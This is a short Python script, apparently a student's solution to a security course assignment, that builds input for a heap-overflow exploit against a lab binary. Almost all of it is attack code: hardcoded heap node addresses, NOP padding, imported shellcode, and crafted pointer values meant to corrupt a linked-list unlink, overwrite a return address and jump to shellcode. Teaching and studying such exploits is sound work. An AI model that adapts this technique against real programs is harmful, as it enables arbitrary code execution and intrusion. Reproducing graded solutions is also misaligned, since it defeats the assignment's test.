#!/usr/bin/env python3
import sys
from shellcode import shellcode
from struct import pack

# You MUST fill in the values of the a, b, and c node pointers below. When you
# use heap addresses in your main solution, you MUST use these values or
# offsets from these values. If you do not correctly fill in these values and use
# them in your solution, the autograder may be unable to correctly grade your
# solution.

# IMPORTANT NOTE: When you pass your 3 inputs to your program, they are stored
# in memory inside of argv, but these addresses will be different then the
# addresses of these 3 nodes on the heap. Ensure you are using the heap
# addresses here, and not the addresses of the 3 arguments inside argv.

node_a = 0x80dd2e0
node_b = 0x80dd310
node_c = 0x80dd340

# Example usage of node address with offset -- Feel free to ignore
#a_plus_4 = pack("<I", node_a + 4)

# Your code here
tab = b'\x09'
nop = b'\x90'
junk = b'\x90'

shellcode_on_stack_addr = pack("<I", 0xffffd656)
ret_to_overwrite = pack("<I", 0xfffe8e3c)
# Setting up each argument that is to be passed into each node's data array
# <0x8048909> mov 0x4(%edx), %edx ==> corrupts shellcode on heap.. need to include it twice ?
# so an uncorrupted copy can be in memory...

argv1 = junk * (20)+  pack("<I", node_a) + junk * 4 + tab

argv2 = junk * (28-len(shellcode)) + shellcode  +(junk*4) +\
shellcode_on_stack_addr + pack("<I",node_b+12)+ ret_to_overwrite +pack("<I", node_c-4)

argv3 = tab + (nop*8) + shellcode
exploit = argv1 + argv2 + argv3

sys.stdout.buffer.write(exploit)
